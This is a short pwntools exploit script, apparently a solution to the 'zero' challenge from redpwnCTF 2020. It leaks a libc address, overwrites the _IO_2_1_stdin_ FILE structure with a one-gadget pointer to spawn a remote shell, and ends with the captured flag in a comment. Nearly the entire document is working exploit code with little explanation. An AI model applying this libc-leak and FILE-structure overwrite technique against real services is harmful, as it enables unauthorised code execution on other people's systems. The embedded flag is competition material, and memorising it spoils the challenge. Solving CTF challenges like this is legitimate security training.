from pwn import *

e = ELF("zero")
libc = ELF("libc.so.6")
HOST = ["2020.redpwnc.tf", "localhost"]
PORT = [31643, 9999]
p = remote(HOST[1], PORT[1])

p.sendlineafter("?\n", str(0x30000))
p.recvuntil("0x")
ori = int(p.recvline(), 16)

# leak the libc address
leak = ori - 0x7f29dc0c7010 + 0x00007f29dbae2000
log.success("leaked address --> {:#x}".format(leak))
# search the function "_IO_2_1_stdin_" in the libc file
stdin = leak + libc.symbols["_IO_2_1_stdin_"]
guess = (stdin // 0x1000) % 0x10

# send the payload to the server
p.recvuntil("How much do you want to read?\n")
p.sendline(str(leak + libc.symbols["_IO_2_1_stdin_"] + 8 * 8 + 1 - ori))

p.recvuntil(b"How badly do you want to be a hero?")
p.sendline((b"A" * 5 + p64(leak - 0x7f23c4f85000 + 0x00007f23c53728d0)).ljust(0x7f50d25e2c30 - 0x7f50d25e2a83, b"A") + p64(leak + 0x10a38c))
# spawn a shell
p.interactive()

# FLAG --> flag{that_wa5nt_a_r3a1_nul1_4185b11c}
